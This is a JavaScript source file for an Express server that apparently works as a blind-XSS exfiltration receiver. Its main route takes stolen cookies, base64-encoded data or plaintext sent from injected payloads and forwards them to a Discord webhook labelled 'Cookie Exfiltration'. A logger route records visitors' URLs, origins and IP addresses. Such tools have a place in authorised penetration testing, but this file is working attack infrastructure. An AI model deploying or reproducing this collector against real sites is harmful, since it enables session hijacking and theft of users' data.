const express = require('express');
const app = express();
const cors = require('cors');
const axios = require('axios');
const path = require('path');
const dotenv = require('dotenv');
const axiosRetry = require('axios-retry').default;
axiosRetry(axios, { retries: 3 });

dotenv.config({ path: path.resolve(__dirname, '../.env') });
const port = 4000

const corsOptions = {
    origin: '*',
    allowedHeaders: '*',
}

app.use(express.static(path.join(__dirname, '../public')));

app.use(cors(corsOptions))
app.get('/', (req, res) => {
    if (Object.keys(req.query).length === 0) {
        res.sendFile(path.join(__dirname, 'index.html'));
    } else{
        const code = req.query.code;
        if (code === process.env.code){
            const cookies = req.query.cookies;
            const b64 = req.query.b64;
            const plaintext = req.query.plaintext;
            const firedAt = req.query.url;
            const by = req.query.by;
            const xss = req.query.xss;
            const origin = req.headers['origin'];
            
            // pre-build / data formatter
            // stores fixed/dynamic values
            const report = {
                firedAt: firedAt,
                by: by,
            }
    
            if (req.headers['xsend-xss-payload']){
                const payload =  req.headers['xsend-xss-payload']
                report.payload = payload
            }
    
            // discord message format
            const discord_message_builder = {
                title: ">>> # XSS DETECTED\n",
                ping: `<@${process.env.discordId}>\n`,
                location_message:`**Location**:  \`${report.firedAt}\`\n`,
                origin_message: `**Origin**: \`${origin}\`\n`,
                payload_message:`**Payload**:  ${report.payload}\n`,
                by_message:`**By**:   ${report.by}\n`,
            }
            
            if (cookies){
                report.cookieValues = cookies.split(";");
                discord_message_builder.cookieMessage = `**Cookies**:   ${report.cookieValues}\n`
                discord_message_builder.action = `**Action**:   Cookie Exfiltration\n`
            } else if (b64){
                report.b64 = atob(b64)
                discord_message_builder.b64 = `**Base64**:   ${report.b64}\n`
                discord_message_builder.action = `**Action**:   Encoded Data Exfiltration\n`
            } else if (plaintext){
                report.plaintext = plaintext
                discord_message_builder.plaintext = `**Text**:   ${report.plaintext}\n`
                discord_message_builder.action = `**Action**:   Data Exfiltration\n`
            }
    
            if (!req.headers["xsend-xss-payload"] && !xss){
                discord_message_builder.title = ">>> # Possible HTML / Dangling Markup Injection\n"
            }
    
            const discord_message = Object.values(discord_message_builder).join(' ')
            axios.post(process.env.alertsWebhook,{
                content: discord_message
            }, {
                timeout: 5000
            })
            .then(() => {
                res.send('request sent').status(201).end()
            })
            .catch(error => {
                console.error('Error:', error);
            });
        } else{
            res.send('incorrect code')
        }
    }
})

// For testing your webhook
app.all('/dev/webhook/test', (req, res) => {
    res.send('')
    axios.post(process.env.logsWebhook,{
        content: 'testing123'
    }, {
        timeout: 5000
    })
    .then(response => {
        console.log('Test GET Success:', response.data);
    })
    .catch(error => {
        console.error('Test GET Error:', error);
    });
})

// Displays instructions on how to use the tool
app.get('/instructions', (req, res) => {
    res.sendFile(path.join(__dirname, 'instructions.html'));
})

app.get('/generate', (req, res) => {
    res.sendFile(path.join(__dirname, 'generate.html'));
})

app.set('trust proxy', true);

// Log any request here
app.all('/logger/:code/*', (req, res) => {
    const loggerCode = req.params.code;
    if (loggerCode === process.env.code){
        const logMessage =  `>>> **[${req.method}]**  ${req.url} \`${req.get('origin')}\` [${req.ip}]\n`
        const d = new Date()
        const discord_message_builder = {
            logMessage: logMessage,
            metadata: `> \`${d}\`\n`,
        }

        const discord_message = Object.values(discord_message_builder).join(' ')
        axios.post(process.env.logsWebhook,{
            content: discord_message
        }, {
            timeout: 5000
        })
        .then(() => {
            res.send('request sent at ' + d)
        })
        .catch(error => {
            console.error('Error:', error);
        });
    } else{
        res.send('Error incorrect code')
    }

    
})

app.listen(port, () => {
    console.log(`running on port ${port}`)
})